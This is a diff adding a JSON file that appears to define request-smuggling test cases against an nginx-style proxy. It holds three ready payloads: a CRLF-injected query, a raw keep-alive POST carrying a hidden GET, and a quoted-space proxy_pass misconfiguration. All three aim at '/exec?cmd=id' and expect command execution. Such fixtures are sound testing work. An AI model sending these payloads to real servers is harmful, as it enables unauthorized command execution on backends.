@@ -1,0 +1,54 @@
+{
+ "dialect": "ngx",
+ "build": "29d05850",
+ "prefix": "/api",
+ "cells": [
+  {
+   "family": "request_line_split",
+   "build": "29d05850",
+   "dialect": "ngx",
+   "source": "r6ascii",
+   "poc": "ev_r6_A_frame.py",
+   "shape": "GET with %0d%0a in the query; upstream receives a second, 4-token request",
+   "expect": "exec",
+   "steps": [
+    {
+     "name": "attack",
+     "path": "/api/x?a%0d%0aGET%20/exec%3fcmd=id%0d%0aHost:%20u%0d%0a%20HTTP/1.1"
+    }
+   ]
+  },
+  {
+   "family": "body_replay_desync",
+   "build": "29d05850",
+   "dialect": "ngx",
+   "source": "r6ascii",
+   "poc": "ev_r6_A_frame.py",
+   "shape": "POST with no framing header; the tail is re-parsed as the next request",
+   "expect": "exec",
+   "steps": [
+    {
+     "name": "attack",
+     "raw": "POST /api/x HTTP/1.1\r\nHost: alpha.test\r\nConnection: keep-alive\r\n\r\nGET /api/exec?cmd=id HTTP/1.1\r\nHost: alpha.test\r\nConnection: close\r\n\r\n"
+    }
+   ]
+  },
+  {
+   "family": "config_quoted_space",
+   "build": "29d05850",
+   "dialect": "ngx",
+   "source": "cfgSpace",
+   "poc": "cspace.py",
+   "shape": "proxy_pass \"http://backend/exec \" - the quoted space splits the upstream line",
+   "expect": "exec",
+   "pass_uri": "\"http://backend/exec \"",
+   "steps": [
+    {
+     "name": "attack",
+     "path": "/api%3fcmd=id"
+    }
+   ]
+  }
+ ],
+ "pass_uri": "/api"
+}
